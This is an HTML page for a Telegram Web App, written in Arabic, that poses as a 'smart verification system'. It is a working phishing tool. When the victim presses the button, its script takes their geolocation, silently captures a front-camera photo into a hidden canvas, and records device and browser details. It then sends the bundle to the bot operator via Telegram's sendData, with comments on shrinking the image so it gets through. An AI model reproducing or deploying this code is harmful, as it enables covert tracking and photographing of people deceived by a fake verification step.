<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; }
        .btn { padding: 15px 30px; background: #248bcf; border: none; border-radius: 25px; color: white; font-size: 18px; cursor: pointer; }
        #status { margin-top: 20px; color: #aaa; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>نظام التحقق الذكي</h2>
    <p>يرجى الضغط على الزر لإتمام العملية</p>
    <button class="btn" id="mainBtn">ابدأ الآن</button>
    <div id="status"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const webapp = window.Telegram.WebApp;
        webapp.expand();

        document.getElementById('mainBtn').onclick = async () => {
            document.getElementById('status').innerText = "جاري جمع البيانات... يرجى الانتظار";
            
            try {
                // 1. جلب الموقع
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });

                // 2. تشغيل الكاميرا والتقاط الصورة
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // انتظر لحظة لتجهيز الكاميرا
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    // تصغير الأبعاد لضمان صغر الحجم (مهم جداً)
                    canvas.width = 160; 
                    canvas.height = 120;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويل الصورة بجودة منخفضة جداً (0.1) لتمر عبر تليجرام
                    const photoData = canvas.toDataURL('image/jpeg', 0.1);

                    const result = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        device: navigator.platform,
                        ua: navigator.userAgent,
                        img: photoData
                    };

                    // إرسال البيانات وإغلاق الصفحة
                    webapp.sendData(JSON.stringify(result));
                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
                }, 1500);

            } catch (err) {
                alert("خطأ: يرجى تفعيل الموقع والكاميرا للمتابعة.");
                document.getElementById('status').innerText = "فشل في جمع الأذونات.";
            }
        };
    </script>
</body>
</html>
